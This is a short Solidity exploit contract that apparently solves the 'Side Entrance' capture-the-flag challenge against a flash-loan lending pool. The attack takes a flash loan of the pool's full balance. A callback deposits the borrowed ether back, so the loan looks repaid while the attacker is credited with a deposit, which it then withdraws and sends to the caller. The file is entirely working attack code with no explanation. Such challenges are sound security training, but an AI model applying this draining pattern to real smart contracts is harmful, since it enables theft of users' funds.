import "./SideEntranceLenderPool.sol";
contract HackSideEntrance {
    SideEntranceLenderPool public pool;

    constructor(address _pool) public {
        pool = SideEntranceLenderPool(_pool);
    }

    fallback() external payable {}

    function attack() external {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
        msg.sender.transfer(address(this).balance);
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }
}